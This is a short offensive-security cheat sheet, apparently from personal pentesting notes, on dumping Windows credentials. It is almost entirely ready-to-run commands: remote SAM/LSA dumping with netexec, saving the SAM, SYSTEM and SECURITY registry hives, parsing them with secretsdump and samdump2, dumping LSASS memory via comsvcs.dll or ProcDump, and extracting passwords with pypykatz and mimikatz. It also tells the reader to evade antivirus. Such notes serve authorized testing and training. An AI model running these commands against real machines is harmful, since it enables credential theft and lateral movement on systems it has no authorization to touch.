>Poor Sam. My condolences.

## Remote Automated Dumping

```sh
netexec smb $target --local-auth -u 'user' -p 'password' --lsa --sam
```

if remote dumping isn't working, see [LocalAccountTokenFilterPolicy]({{< relref "8. Lateral Movement/Impacket-exec#localaccounttokenfilterpolicy" >}})

## SAM

```powershell
reg save hklm\sam sam
reg save hklm\system system
reg save hklm\security security
```

> Transfer the 3 files to attacker machine using any methods in `File Transfer/Windows Target`

Attacker machine

```sh
impacket-secretsdump -sam sam -system system -security security local
```

Or

```
samdump2 system sam
```

## LSA

### Create `lsass` memory dump

> LSASS stores credentials that have **active logon** sessions.

First, we have to make a memory dump of the live `lsass.exe` process. You can do it with `Task Manager` if you have a GUI

![](/images/2c12d6d2c99b798493187852aef6f8747d23351cd122d6d3d4dc0b1097cb4dd4.jpeg)

Or, we can do it on the CLI.

First, we have to find `pid` of `lsass` process

```powershell
# cmd
tasklist /svc
# powershell. way easier
Get-Process lsass
```

Then, we can create a memory dump. Most AV blocks this. Don't get caught :D

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

We can also use the [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) tool from sysinternals to dump `lsass`'s memory

First we download the tool and transfer it to target machine

```sh
wget https://download.sysinternals.com/files/Procdump.zip
unzip Procdump.zip
# Then transfer it to target machine using any way you want :D
```

Then we can create the dump file

```cmd
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### Extracting

We can use the `pypykatz` tool **on linux** to extract credentials out of the memory dump

```sh
pypykatz lsa minidump ./lsass.dmp 
```

Or, we can use `mimikatz`, if you are **on windows**

```cmd
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```
